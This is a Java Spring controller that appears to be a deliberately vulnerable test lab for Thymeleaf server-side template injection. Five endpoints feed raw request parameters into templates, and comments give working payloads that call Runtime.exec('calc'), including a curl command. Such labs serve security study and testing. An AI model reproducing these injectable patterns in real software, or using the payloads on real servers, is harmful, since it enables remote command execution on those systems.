package com.example.thymeleaf;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;


@Controller
class IndexController {
    //404error页面，需使用jetty运行  curl "http://localhost:8080/(\$\{T(java.lang.Runtime).getRuntime().exec('calc')\})" -H 'Accept: text/html'

    //GET /url?link=($%7bT(java.lang.Runtime).getRuntime().exec('calc')%7d)
    @GetMapping("/url")
    public String url(@RequestParam(name="link") String link, Model model) {
        model.addAttribute("link", link);
        return "url";
    }

    // GET /message?msg=${T(java.lang.Runtime).getRuntime().exec('calc')}
    @GetMapping("/message")
    public String test(@RequestParam(name="msg") String msg, Model model) {
            model.addAttribute("msg", msg);
        return "message";
    }

    // GET /selector?fieldName=T(java.lang.Runtime).getRuntime().exec('calc')
    @GetMapping("/selector")
    public String selector(@RequestParam(name="fieldName") String fieldName, Model model) {
        model.addAttribute("obj",new User());
        model.addAttribute("fieldName", fieldName);
        return "selector";
    }

    //GET /variable?fieldName=name eq T(java.lang.Runtime).getRuntime().exec('calc')
    @GetMapping("/variable")
    public String variable(@RequestParam(name="fieldName") String fieldName, Model model) {
        model.addAttribute("user",new User());
        model.addAttribute("fieldName", fieldName);
        return "variable";
    }


    //GET /frag?section=${T(java.lang.Runtime).getRuntime().exec('calc')}
    @GetMapping("/frag")
    public String fragment(@RequestParam(name="section") String section, Model model) {
        model.addAttribute("section", section);
        return "frag";
    }

    class User {
        public String name = "john";
        public String sex = "male";
    }
}
